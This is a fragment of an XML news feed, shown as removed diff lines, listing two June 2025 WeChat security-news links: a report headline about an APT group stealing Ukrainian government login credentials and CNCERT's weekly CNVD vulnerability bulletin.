-  </entry>
-  
-  <entry>
-    <title>曹县 APT 黑客攻击乌克兰政府机构窃取登录凭证</title>
-    <link href="http://example.com/2025/06/17/weixin_2272605276/"/>
-    <id>http://example.com/2025/06/17/weixin_2272605276/</id>
-    <published>2025-06-17T01:03:53.343Z</published>
-    <updated>2025-06-17T01:03:53.341Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/SDcoLvucrcB3q4rbX28IAA">https://mp.weixin.qq.com/s/SDcoLvucrcB3q4rbX28IAA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/SDcoLvucrcB3q4rbX28IAA&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CNVD漏洞周报2025年第22期</title>
-    <link href="http://example.com/2025/06/17/weixin_3102632269/"/>
-    <id>http://example.com/2025/06/17/weixin_3102632269/</id>
-    <published>2025-06-17T00:53:06.093Z</published>
-    <updated>2025-06-17T00:53:06.090Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/c1qJP5Rro6zxEBOoVDkiSw">https://mp.weixin.qq.com/s/c1qJP5Rro6zxEBOoVDkiSw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 国家互联网应急中心CNCERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/c1qJP5Rro6zxEBOoVDkiSw&quot;&gt;https://mp.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="国家互联网应急中心CNCERT" scheme="http://example.com/tags/%E5%9B%BD%E5%AE%B6%E4%BA%92%E8%81%94%E7%BD%91%E5%BA%94%E6%80%A5%E4%B8%AD%E5%BF%83CNCERT/"/>
     
   </entry>
   
